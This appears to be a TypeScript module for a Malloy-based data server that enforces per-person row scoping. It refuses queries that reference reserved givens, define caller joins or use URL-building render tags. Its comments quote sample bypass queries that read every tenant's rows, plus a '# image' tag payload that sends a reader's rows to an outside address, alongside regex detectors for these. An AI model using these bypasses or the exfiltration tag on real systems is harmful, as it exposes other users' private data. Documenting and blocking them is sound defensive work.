// Copyright (c) The Malloy Foundation
// SPDX-License-Identifier: MIT

/**
 * Givens the HOST supplies, and the gate that keeps a query from quietly
 * ignoring them.
 *
 * The SUPPLY is core's job, not ours. A host puts its values on the Runtime
 * (`new Runtime({ givens })`) and names them in `config.finalizeGivens`; core
 * then refuses a per-query override, refuses to run when a finalized name has
 * no value, and hides the name from `Model.givens` so no UI offers to edit it.
 * This module used to reimplement all three. It does not any more.
 *
 * What core cannot know is whether a query that *could* ignore the value
 * actually does. A model author can keep `given: MALLOYYO_EMAIL` and delete the
 * `where:` that used it — or extract a new source from a filtered one and leave
 * the filter behind — and every declaration-shaped check still passes while the
 * rows stop being scoped. That is the accident this file exists for.
 *
 * `PreparedQuery.givens` reports what a query REFERENCES, not what the model
 * declares, so the gate is a set test. It is cheap and it is honest about its
 * limits: a query that mentions the given without filtering on it passes, and
 * so does one whose filter has been widened. Only running the same query under
 * two identities distinguishes those, which belongs at publish, not here.
 */

/** Names a query must reference, or the run is refused. */
export type RequiredGivens = readonly string[];

/**
 * The prefix a Malloyyo server reserves for givens it supplies itself.
 *
 * Hardcoded rather than passed in, and that is the point. Core's
 * `finalizeGivens` locks these names — but only the ones the host actually
 * finalized, which is `datasets.required_givens`. A model that DECLARES
 * `MALLOYYO_EMAIL` on a dataset nobody ticked the box for is not locked by
 * anything, and it looks fine from the outside: the declaration default `''`
 * matches no rows, so every view renders empty and nothing says why. A caller
 * who passes the name themselves then chooses whose rows they read.
 *
 * So the strip below does not consult the requirement list, does not take an
 * option, and cannot be turned off at a call site. A configuration mistake
 * must not be the difference between scoped and impersonatable.
 */
export const RESERVED_GIVEN_PREFIX = 'MALLOYYO_';

/**
 * A caller's given map with every reserved name removed.
 *
 * Silent rather than an error: a caller cannot set these, so there is nothing
 * for them to correct, and a model that needs one gets it from the Runtime. The
 * one case that would deserve a message — a caller deliberately probing — is
 * the case that must learn the least.
 */
export function withoutReservedGivens<T>(
  givens: Readonly<Record<string, T>> | undefined,
): Record<string, T> | undefined {
  if (!givens) return undefined;
  const kept: Record<string, T> = {};
  for (const [name, value] of Object.entries(givens)) {
    if (!name.startsWith(RESERVED_GIVEN_PREFIX)) kept[name] = value;
  }
  return kept;
}

/**
 * The required names, when a query references NONE of them. Empty means pass.
 *
 * ANY, not all. A model may be scoped on more than one axis — one source by the
 * asker's address, another by the roles they hold — and demanding every name in
 * every query would make declaring two of them unusable. What the gate is for
 * is catching a query that is scoped by nothing at all, and one reference is
 * enough to say it is not.
 *
 * Note the direction: a query is refused for what it FAILS to reference, so a
 * query over an unfiltered source stands out while an ordinary query over a
 * filtered one passes without mentioning anything — the `where:` rides on the
 * source, and the reference comes with it.
 */
export function unreferencedGivens(
  required: RequiredGivens,
  referenced: Iterable<string>,
): string[] {
  if (required.length === 0) return [];
  const seen = new Set(referenced);
  if (required.some((name) => seen.has(name))) return [];
  return [...required].sort();
}

/**
 * Why caller-written Malloy may not run against scoped data, or null if it may.
 *
 * `unreferencedGivens` asks whether the compiled query references the scoping
 * given ANYWHERE. That is the right test for a query over a source the MODEL
 * defined, and no test at all once the caller can put the reference there
 * themselves. Both of these were run against the real engine and returned every
 * tenant's rows with the gate on:
 *
 *   run: raw -> { select: who, _ is $MALLOYYO_EMAIL }
 *     — an unfiltered source, plus a column that merely mentions the given;
 *
 *   run: mine extend { join_cross: r is raw } -> { select: r.who }
 *   run: raw extend { join_cross: m is mine } -> { select: who, m.who }
 *     — the reference rides in on the scoped source of a join the CALLER
 *       wrote, in either direction, without the given being named at all.
 *
 * So on scoped data, text a caller wrote may do neither: it may not name a
 * reserved given, and it may not define a join. With those two closed, the only
 * way a query references the given is through what the model itself defines on
 * the source it runs over — which is what the gate was always assuming. A join
 * between sources is the model author's to write, because it is a statement
 * about which rows belong together; a caller who needs one asks for it in the
 * model.
 *
 * LEXICAL, AND DELIBERATELY SO. It runs on the raw text, comments and string
 * literals included, with no attempt to skip either: a scanner that skips
 * "comments" can be handed `'//'` in a string to hide what follows. The price is
 * a refusal for text that only mentions these in a comment, which says so and
 * costs a retry. Case-insensitive for the same fail-closed reason.
 *
 * A THIRD THING, for the same audience: the `# image` and `# link` render tags.
 * They are not a way past the gate — they are a way to carry what the gate
 * correctly returned to somebody else. A draft dashboard or a shared query is
 * written by one member and RUN AS whoever opens it, so on scoped data its
 * rows are the reader's, not the author's; a column tagged `# image` whose
 * value is `concat('https://elsewhere/?d=', …)` has the reader's browser send
 * those rows to the author, with no click. A tag on a field in the published
 * model is the publisher's to write, and is untouched.
 *
 * Applies to every piece of text someone other than the model's publisher
 * wrote: an ad-hoc query, a dashboard panel's inline Malloy, a run-expression,
 * and a draft dashboard's own `.malloy` file.
 */
export function scopeEscape(text: string, required: RequiredGivens): string | null {
  if (required.length === 0) return null;
  if (RESERVED_REFERENCE.test(text)) {
    return (
      `this data is scoped per person, and a query here may not reference $${RESERVED_GIVEN_PREFIX}… itself ` +
      '(not even in a comment). The scope comes from the source the model defines; query that source as it is.'
    );
  }
  if (URL_RENDER_TAG.test(text) || ESCAPED_ANNOTATION.test(text)) {
    return (
      'this data is scoped per person, and a query or draft here may not use the "# image" or "# link" render tags ' +
      '(or a backslash in any "#" tag): what it returns belongs to whoever opens it, and those tags make their ' +
      'browser load an address built from it. Put the tag on the field in the model.'
    );
  }
  if (CALLER_JOIN.test(text)) {
    return (
      'this data is scoped per person, and a query here may not define a join (join_one / join_many / join_cross): ' +
      'joining a scoped source to an unscoped one reads rows the scope hides. Joins on scoped data belong in the model.'
    );
  }
  return null;
}

/** A dollar sign, then — through any whitespace or backquotes — a reserved name. */
const RESERVED_REFERENCE = new RegExp('[$][\\s\\u0060]*' + RESERVED_GIVEN_PREFIX, 'i');
const CALLER_JOIN = /\bjoin_(one|many|cross)\b/i;
/** An annotation (`#` to end of line, wherever on the line it starts) naming
    one of the two render tags whose value becomes a URL the browser loads. */
const URL_RENDER_TAG = /#[^\n]*\b(image|link)\b/i;
/** …or carrying an escape, which is how a tag name would be spelled to get
    past the line above. No ordinary tag needs one. */
const ESCAPED_ANNOTATION = /#[^\n]*\\/;

/** What to tell a caller whose query skipped one. */
export function unreferencedGivensMessage(missing: string[]): string {
  const many = missing.length > 1;
  return (
    `${missing.join(', ')}: this data is scoped by ${many ? 'these givens' : 'this given'}, and the ` +
    `query references ${many ? 'none of them' : 'it nowhere'}. A query here must run against a source ` +
    `that filters on ${many ? 'one of them' : 'it'} — put the filter on the source ` +
    `(\`source: x is … extend { where: owner = $${missing[0]} }\`) so every query over it carries the scope.`
  );
}

/** The names a model declares, as the binder sees them. Used at publish time to
    learn what a dataset requires; a serving runtime cannot see them, because
    `finalizeGivens` hides finalized names from `Model.givens` by design. */
export function declaredGivenNames(model: {
  givens?: ReadonlyMap<string, unknown>;
}): ReadonlySet<string> {
  return new Set(model.givens?.keys() ?? []);
}
